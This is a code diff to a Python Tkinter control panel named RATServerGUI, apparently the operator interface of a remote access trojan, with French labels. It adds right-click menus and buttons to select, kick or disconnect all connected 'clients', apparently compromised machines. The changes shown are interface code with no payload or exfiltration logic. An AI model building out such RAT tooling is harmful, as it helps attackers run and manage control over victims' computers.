@@ -351,12 +351,15 @@ class RATServerGUI:
                            bg=self.bg_sidebar, troughcolor=self.bg_main)
         sb.pack(side="right", fill="y")
         self.client_listbox.config(yscrollcommand=sb.set)
+        self.client_listbox.bind("<Button-3>", self._client_context_menu)
 
         btn_row = tk.Frame(clients_frame, bg=self.bg_card)
         btn_row.pack(fill="x", padx=8, pady=(0, 8))
         ttk.Button(btn_row, text="Actualiser",   command=self.refresh_clients).pack(side="left", padx=3)
         ttk.Button(btn_row, text="Connecter",    command=self.connect_to_client).pack(side="left", padx=3)
-        ttk.Button(btn_row, text="Déconnecter", command=self.disconnect_client,
+        ttk.Button(btn_row, text="Déconnecter", command=self.disconnect_selected,
+                   style="Danger.TButton").pack(side="left", padx=3)
+        ttk.Button(btn_row, text="Kick tous", command=self.disconnect_all,
                    style="Danger.TButton").pack(side="left", padx=3)
         self.start_btn = ttk.Button(btn_row, text="▶ Démarrer serveur", command=self.start_server)
         self.start_btn.pack(side="right", padx=3)
@@ -1165,15 +1168,77 @@ DÉMARRAGE RAPIDE:
         self.log_message(f"Selected client #{cid}", "success")
         self.refresh_clients()
 
+    def _cid_from_listbox_entry(self, entry):
+        try:
+            return int(entry.split("#")[1].split(" ")[0])
+        except (IndexError, ValueError):
+            return None
+
+    def _kick_cid(self, cid):
+        with self.lock:
+            c = self.clients.pop(cid, None)
+        if c:
+            try: send_msg(c["socket"], "exit", c.get("key"))
+            except: pass
+            try: c["socket"].close()
+            except: pass
+            if self.current_client_id == cid:
+                self.current_client_id = None
+            self.log_message(f"Client #{cid} ({c['address'][0]}) kicked", "warning")
+        self.refresh_clients()
+
     def disconnect_client(self):
         if not self.current_client_id:
             return
-        sock, key = self._get_sock_key()
-        if sock:
-            try: send_msg(sock, "exit", key)
-            except: pass
-        self._drop_client()
-        self.log_message("Client disconnected", "info")
+        self._kick_cid(self.current_client_id)
+
+    def disconnect_selected(self):
+        sel = self.client_listbox.curselection()
+        if not sel:
+            self.log_message("Sélectionne un client dans la liste d'abord", "warning"); return
+        cid = self._cid_from_listbox_entry(self.client_listbox.get(sel[0]))
+        if cid is not None:
+            self._kick_cid(cid)
+
+    def disconnect_all(self):
+        with self.lock:
+            cids = list(self.clients.keys())
+        if not cids:
+            self.log_message("Aucun client connecté", "info"); return
+        for cid in cids:
+            self._kick_cid(cid)
+        self.log_message(f"{len(cids)} client(s) déconnecté(s)", "warning")
+
+    def _client_context_menu(self, event):
+        idx = self.client_listbox.nearest(event.y)
+        if idx < 0 or idx >= self.client_listbox.size():
+            return
+        self.client_listbox.selection_clear(0, tk.END)
+        self.client_listbox.selection_set(idx)
+        entry = self.client_listbox.get(idx)
+        cid = self._cid_from_listbox_entry(entry)
+        if cid is None:
+            return
+        menu = tk.Menu(self.root, tearoff=0,
+                       bg=self.bg_card, fg=self.text_color,
+                       activebackground=self.accent_color,
+                       activeforeground=self.bg_main,
+                       font=("Segoe UI", 9))
+        menu.add_command(label=f"Connecter  #{cid}",   command=lambda: self._select_cid(cid))
+        menu.add_separator()
+        menu.add_command(label=f"Kick  #{cid}",         command=lambda: self._kick_cid(cid),
+                         foreground=self.error_color)
+        menu.add_command(label="Kick tous",              command=self.disconnect_all,
+                         foreground=self.error_color)
+        menu.tk_popup(event.x_root, event.y_root)
+
+    def _select_cid(self, cid):
+        with self.lock:
+            if cid not in self.clients:
+                self.log_message("Client introuvable", "error"); self.refresh_clients(); return
+        self.current_client_id = cid
+        self.log_message(f"Selected client #{cid}", "success")
+        self.refresh_clients()
 
     def send_command(self, event=None):
         cmd = self.cmd_entry.get().strip()
